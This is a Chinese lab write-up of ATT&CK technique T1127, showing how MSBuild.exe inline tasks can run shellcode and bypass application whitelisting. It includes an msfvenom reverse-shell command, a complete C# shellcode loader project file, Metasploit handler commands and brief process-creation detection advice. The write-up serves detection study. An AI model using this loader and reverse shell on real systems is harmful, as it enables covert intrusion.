# T1127-win-基于白名单Msbuild.exe执行payload

## 来自ATT&CK的描述

MSBuild.exe（Microsoft Build Engine）是Visual Studio使用的软件构建平台。它采用XML格式的项目文件，定义了各种平台的构建要求和配置。

攻击者可能会使用MSBuild通过受信任的Windows实用程序来代理执行代码。.NET 4中引入的MSBuild内联任务功能允许将C＃代码插入到XML项目文件中。内联任务MSBuild将编译并执行内联任务。MSBuild.exe是一个微软签名的二进制文件，因此当它以这种方式使用时，它可以执行任意代码并绕过配置为允许MSBuild.exe执行的应用白名单防御。

## 测试案例

MSBuild 是 Microsoft Build Engine 的缩写，代表 Microsoft 和 Visual Studio的新的生成平台。MSBuild在如何处理和生成软件方面是完全透明的，使开发人员能够在未安装Visual Studio的生成实验室环境中组织和生成产品。

MSBuild 引入了一种新的基于 XML的项目文件格式，这种格式容易理解、易于扩展并且完全受 Microsoft 支持。MSBuild项目文件的格式使开发人员能够充分描述哪些项需要生成，以及如何利用不同的平台和配置生成这些项。

说明：Msbuild.exe所在路径没有被系统添加PATH环境变量中，因此，Msbuild命令无法识别。

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

win7默认位置：

`C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe`

## 检测日志

windows 安全日志（需要自行配置）据称可以绕过360，待确认

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：windows server 2012

### 测试过程

#### MSF生成载荷

```bash
msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp
```

![载荷](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20220502155132124.png)

#### XML文件设置

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
    <Target Name="Hello">
      <ClassExample />
    </Target>
    <UsingTask
      TaskName="ClassExample"
      TaskFactory="CodeTaskFactory"
      AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
      <Task>

        <Code Type="Class" Language="cs">
        <![CDATA[
    using System;
    using System.Runtime.InteropServices;
    using Microsoft.Build.Framework;
    using Microsoft.Build.Utilities;
    public class ClassExample :  Task, ITask
    {
      private static UInt32 MEM_COMMIT = 0x1000;
      private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
      [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
      [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
        UInt32 lpThreadAttributes,
        UInt32 dwStackSize,
        UInt32 lpStartAddress,
        IntPtr param,
        UInt32 dwCreationFlags,
        ref UInt32 lpThreadId
        );
      [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds
        );
      public override bool Execute()
      {
        byte[] shellcode = new byte[] {
你的payload};

          UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
          Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
          IntPtr hThread = IntPtr.Zero;
          UInt32 threadId = 0;
          IntPtr pinfo = IntPtr.Zero;
          hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
          WaitForSingleObject(hThread, 0xFFFFFFFF);
          return true;
      }
    }
        ]]>
        </Code>
      </Task>
    </UsingTask>
  </Project>
```

![XML文件设置](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70.png)

#### 设置监听

```bash
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.126.146
msf exploit(multi/handler) > set lport 4444
msf exploit(multi/handler) > exploit
```

![监听](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20220502155109540.png)

#### 靶机执行payload

```dos
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.xml
```

![加载payload](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20220502155113066.png)

#### 查看会话

![反弹会话](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20220502155121704.png)

## 测试留痕

![日志留痕](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20220502155115855.png)

## 检测规则/思路

无具体检测规则，可根据进程创建事件4688/1（进程名称、命令行）进行监控。本监控方法需要自行安装配置审核策略Sysmon。

## 参考推荐

MITRE-ATT&CK-T1127

<https://attack.mitre.org/techniques/T1127/>

利用msbuild.exe绕过应用程序白名单安全机制的多种姿势

<https://www.freebuf.com/articles/network/197706.html>

GreatSCT|MSF|白名单

<http://www.secist.com/archives/6082.html>

对亮神基于白名单Msbuild.exe执行payload第一季复现

<https://blog.csdn.net/ws13129/article/details/89736941>

检测白名单Msbuild.exe执行payload

<https://blog.csdn.net/qq_36334464/article/details/105487176>

基于白名单执行payload

<https://www.jianshu.com/p/cdb1867c6abb>
